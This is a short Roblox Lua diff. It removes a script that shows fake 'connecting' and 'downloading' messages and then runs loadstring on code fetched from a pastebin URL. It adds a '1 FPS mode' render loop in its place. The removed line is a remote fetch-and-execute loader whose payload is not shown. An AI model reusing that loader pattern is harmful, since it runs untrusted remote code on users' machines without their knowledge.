@@ -1,12 +1,11 @@
-print("Initializing...")
-task.wait(1)
+local RunService = game:GetService("RunService")
 
-print("Connecting to server...")
-task.wait(1)
+print("1 FPS mode activated")
 
-print("Downloading assets...")
-task.wait(1)
-
-print("Starting script...")
-
-loadstring(game:HttpGet("https://pastebin.com/raw/SfjN5iDd"))()
+RunService.RenderStepped:Connect(function()
+	-- Freeze the frame for 1 second
+	local start = tick()
+	while tick() - start < 1 do
+		task.wait()
+	end
+end)
